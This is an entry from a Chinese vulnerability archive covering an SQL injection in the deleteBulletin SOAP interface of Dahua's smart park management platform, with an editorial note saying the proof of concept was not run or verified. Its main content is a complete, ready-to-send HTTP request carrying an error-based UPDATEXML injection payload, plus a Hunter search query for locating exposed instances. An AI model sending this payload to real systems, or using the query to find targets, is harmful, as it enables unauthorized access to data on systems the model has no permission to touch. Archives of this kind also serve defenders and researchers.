---
source: "wy876 漏洞文库"
id: "vw-0deeecfffa75031b8e01f4e1"
entity_id: "ve-0deeecfffa75031b8e01f4e1"
schema_version: "1"
title: "大华智慧园区综合管理平台deleteBulletin SQL注入漏洞"
product: "Dahua智慧园区平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie声明；MySQL报错函数，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0deleteBulletinSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/in7vnveyi5bug7u3"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"Dahua 大华 智慧园区管理平台\""
---

# 大华智慧园区综合管理平台deleteBulletin SQL注入漏洞

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Dahua智慧园区平台
- 本文讨论：itcBulletin deleteBulletin netMarkings SQL注入
- 版本、权限与配置前提：无Cookie声明；MySQL报错函数，版本未知
- 资料类型：SOAP SQL注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同837方法/参数，载荷多右括号与未闭AND需结合SQL上下文核，不能凭独立表达式判有效
- 未授权/系统权限延伸没有响应或源码证据
- 删除接口副作用、Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 匿名对照、括号上下文/DB权限和产品关系待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
  “大华智慧园区综合管理平台”是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。大华智慧园区综合管理平台未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter：`app.name="Dahua 大华 智慧园区管理平台"`


+ 登录页面：


# 四、漏洞复现
```http
POST /portal/services/itcBulletin HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: {hostname}
Content-Length: 442

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <itc:deleteBulletin>
         <!--type: string-->
         <netMarkings>(UPDATEXML(2326,
        CONCAT(0x2e,0x71706a7171,(select 111*111),0x71706a7171),4027)))AND (2373=2373</netMarkings>
      </itc:deleteBulletin>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/in7vnveyi5bug7u3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
